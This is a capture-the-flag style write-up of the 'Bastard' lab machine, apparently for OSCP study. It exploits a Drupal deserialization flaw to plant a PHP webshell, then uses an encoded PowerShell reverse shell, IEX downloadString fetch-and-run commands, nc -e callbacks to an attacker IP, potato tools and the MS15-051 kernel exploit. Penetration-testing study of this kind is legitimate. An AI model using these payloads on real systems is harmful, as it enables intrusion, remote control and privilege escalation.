---
layout: post
title: "bastard"
date: 2025-09-11 
categories: OSCP Playlist
---
# bastard

# Summary

- Drupal 7.5 arbitrary object deserialization allowing upload of webshell
- webshell to reverse shell
- SeImpersonatePrivilege enabled
- Sherlock.ps1 exeuted, bypassing execution policy with echo <COMMAND downloadString> | powershell -noprofile -
- Find MSs15-051 vuln
- executed with nc reverse shell to get root

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/bastard 10.10.10.9

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Welcome to Bastard | Bastard
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The webserver is using IIS 7.5, which has known vulnerabilities. Let’s visit the web page:

![image.png]({{ site.baseurl }}/assets/bastard/image.png)

This is a drupal application and version 7.

Let’s fuzz:

```bash
feroxbuster -u http://10.10.10.9 -C 404

200      GET       44l      290w     1874c http://10.10.10.9/INSTALL.pgsql.txt                                                                   
200      GET       31l      209w     1298c http://10.10.10.9/INSTALL.sqlite.txt                                                                  
200      GET       45l      262w     1717c http://10.10.10.9/INSTALL.mysql.txt                                                                   
200      GET      339l     2968w    18092c http://10.10.10.9/LICENSE.txt                                                                         
200      GET      307l      846w     8710c http://10.10.10.9/MAINTAINERS.txt                                                                     
200      GET      400l     2475w    17995c http://10.10.10.9/INSTALL.txt                                                                         
200      GET      246l     1501w    10123c http://10.10.10.9/UPGRADE.txt                                                                         
200      GET     2284l    16004w   110781c http://10.10.10.9/CHANGELOG.txt                                                                       
403      GET       29l       92w     1233c http://10.10.10.9/cron.php                                                                            
403      GET       29l       92w     1233c http://10.10.10.9/search                                                                              
403      GET       29l       92w     1233c http://10.10.10.9/admin                                                                               
200      GET      152l      395w     7440c http://10.10.10.9/user/login                                                                          
200      GET      187l      868w    13319c http://10.10.10.9/filter/tips                                                                         
403      GET       29l       92w     1233c http://10.10.10.9/user/logout                                                                         
200      GET      154l      463w     8092c http://10.10.10.9/user/register 
```

We also search for CHANGELOG.txt and we find the version of Drupal 7.54:

![image.png]({{ site.baseurl }}/assets/bastard/image%201.png)

We know this version of Drupal is vulnerable. We use this exploit:

https://www.exploit-db.com/exploits/44448

Let’s download it. First let’s confirm the vulnerability. Let’s change the URL:

```bash
python3 exploit.py

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): 
http://10.10.10.9/
```

Does not work. Let’s find another exploit. We find this:

https://www.exploit-db.com/exploits/41564

The explanation for this exploit is on this page:

https://blog.lexfo.fr/drupal-services-module-rce.html

The vulnerability discussed here is insecure use of PHP's unserialize() function on user-controlled input when the Content-Type header is set to application/vnd.php.serialized, allowing arbitrary object deserialization.s

- Privilege Escalation: Attackers can log in as administrators without valid credentials by manipulating deserialized objects.
- SQL Injection: Deserialized objects can inject malicious SQL into database queries, enabling data extraction or modification (e.g., changing admin passwords).
- RCE: By altering cached API configurations via deserialized gadgets, attackers can execute arbitrary PHP code, like writing files to the server.

Now, we need to know the rest endpoint path. We can fuzz with:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt:FUZZ -u http://10.10.10.9/FUZZ -ic
```

However, we get errored out. We search on LLMs to give us likely rest endpoint, we get:

- /api – The most frequently used and recommended default in tutorials and official docs (e.g., configuring a basic REST server).
- /rest – Often seen in custom or module-specific setups, especially for node or entity resources.
- /endpoint – A generic placeholder used in many beginner guides for testing.
- /test – Commonly used for demo or development endpoints.
- /note or /notes – Example paths from Services module quick-start guides for simple resource testing.
- /services – Sometimes prefixed for broader API access, though less common for pure REST.
- /api/v1 – Versioned paths like this are popular for production APIs to allow future updates.

After visiting /rest, we get:

![image.png]({{ site.baseurl }}/assets/bastard/image%202.png)

We have found it. Now let’s replace the following in our script; URL, endpoint path, we also want to change our payload to a web shell:

```bash
$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'rev.php',
    'data' => '<?php system($_REQUEST["cmd"]); ?>'
];
    
```

Now let’s execute. We also need to download:

```bash
sudo apt install php-curl
php exploit.php

#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.10.10.9/rev.php

```

We have several new attack angles now. First, we have the administrator’s cookie sessions from session.json, we can use this to bypass logon:

```bash
cat session.json                                                                       
{
    "session_name": "SESSd873f26fc11f2b7e6e4aa0f6fce59913",
    "session_id": "uuD-98Sdg2MNMWvMvOyIML9ST50QVE9PMQSQpwhKa24",
    "token": "64PWmVbEKdsDZ07D7e50Iv0hBZ9kkUOAfUxPbZw8ILM"
}
```

However, using burp to bypass the cookie still results in us getting us kicked out of the admin dashboard after bypassing login:

```bash
GET / HTTP/1.1
Host: 10.10.10.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: SESSd873f26fc11f2b7e6e4aa0f6fce59913=uuD-98Sdg2MNMWvMvOyIML9ST50QVE9PMQSQpwhKa24
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

![image.png]({{ site.baseurl }}/assets/bastard/image%203.png)

![image.png]({{ site.baseurl }}/assets/bastard/image%204.png)

We also have the user.json created, where we get a password hash. Let’s attempt to crack that:

```bash
$S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE
```

Put that into a file and:

```bash
.\hashcat.exe -m 7900 wordlists\hash.txt wordlists\rockyou.txt
```

While that is cracking (does not crack at the end), we can execute the reverse shell we wrote on the server. First start a listener:

```bash
nc -lnvp 4444
```

Now visit our web shell:

```bash
http://10.10.10.9/rev.php?cmd=whoami
```

![image.png]({{ site.baseurl }}/assets/bastard/image%205.png)

It works. Now let’s get a reverse shell back. 

First we have to encode Invoke-PowerShellTcpOneLine.ps1  in base64:

```bash
cat shell.ps1 | iconv -t utf-16le | base64 -w 0

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANwAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA

#The whole command with powershell
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANwAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA
```

Now on burp, change the request to POST request so it’s easier, and remember to URL encode it with Ctrl+U

```bash
cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANwAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2bACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA
```

We now have shell:

![image.png]({{ site.baseurl }}/assets/bastard/image%206.png)

Let’s check our privileges: 

```bash
whoami /priv

SeImpersonatePrivilege  Impersonate a client after authentication Enabled
```

We have SeImpersonatePrivilege, this mean we can either try potato exploits or printspoofer exploit. Let’s host a python server so we can transfer the tools we need across:

```bash
python3 -m http.server 8001
```

Let’s also check what architecture the computer is:

```bash
cd C:\Users\Public

systeminfo

<SNIP>
System Type:               x64-based PC 
```

Now let’s transfer the exploits:

```bash
iwr http://10.10.16.7:8001/nc.exe -OutFile nc.exe

#did not work
```

```bash
#This has to be iusr's home dir which is C:\inetpub\drupal-7.54, where we first landed

(New-Object Net.WebClient).DownloadFile('http://10.10.16.7:8001/nc.exe','nc.exe')
(New-Object Net.WebClient).DownloadFile('http://10.10.16.7:8001/printspoofer.exe','printspoofer.exe')
(New-Object Net.WebClient).DownloadFile('http://10.10.16.7:8001/JuicyPotato.exe','JuicyPotato.exe')
```

Another way is use the tools is to set up a smb server and mount the share onto a drive

```bash
#on attack host
sudo impacket-smbserver share -smb2support .

#now on target 
net use Z: \\10.10.16.7\share
```

Now we can use it like such:

```bash
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

\\10.10.16.7\share\printspoofer.exe -c "\\10.10.16.7\share\nc.exe 10.10.16.7 9001 -e cmd"

.\printspoofer.exe -c ".\nc.exe 10.10.16.7 9001 -e cmd"
```

Did not work. Let’s use a potato exploit:

```bash
\\10.10.16.7\share\JuicyPotato.exe -l 53372 -p c:\windows\system32\cmd.exe -a "/c \\10.10.16.7\share\nc.exe 10.10.16.7 9001 -e cmd.exe" -t *

.\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a ".\nc.exe 10.10.16.7 9001 -e cmd.exe" -t *
```

Both did not work… Let’s use Sherlock.ps1 to find a suitable vulnerability:

```bash
(New-Object Net.WebClient).DownloadFile('http://10.10.16.7:8001/Sherlock.ps1','Sherlock.ps1')

Import-Module .\Sherlock.ps1
Find-AllVulns
```

Looks like we have to bypass execution policy:

```bash
powershell -ExecutionPolicy Bypass -File Sherlock.ps1
#or we can do it for all
Set-ExecutionPolicy Bypass -Scope Process
```

Doesn’t work. Another way is this:

```bash
echo IEX(New-Object Net.WebClient).downloadString('http://10.10.16.7:8001/Sherlock-ex.ps1') | powershell -noprofile - 
```

It worked. Remember, if something is wrong, do this:

```bash
echo IEX(New-Object Net.WebClient).downloadString('http://10.10.16.7:8001/Sherlock-ex.ps1') | powershell -noprofile - > Sherlock.result 2>&1
```

To look at the error and debug what went wrong. The redirect outputs result to Sherlock.result, but also the error to Sherlock.result, as it’s redirected to stdout.

Finally, we have output:

![image.png]({{ site.baseurl }}/assets/bastard/image%207.png)

```bash
Title      : ClientCopyImage Win32k                                                                                                              
MSBulletin : MS15-051                                                                                                                            
CVEID      : 2015-1701, 2015-2433                                                                                                                
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable
```

We search MS15-051 github. The result:

[https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

Let’s upload the exploit and see if it works:

```bash
#on attack 
unzip MS15-051-KB3045171.zip

#from target
(New-Object Net.WebClient).DownloadFile('http://10.10.16.7:8001/ms15-051x64.exe','ms15-051x64.exe')
```

![image.png]({{ site.baseurl }}/assets/bastard/image%208.png)

We are now nt authority\system

Let’s get a shell back:

```bash
.\ms15-051x64.exe ".\nc.exe -e cmd 10.10.16.7 9001"
```

set up listener:

```bash
nc -lnvp 9001
```

Now we can read the flags:

![image.png]({{ site.baseurl }}/assets/bastard/image%209.png)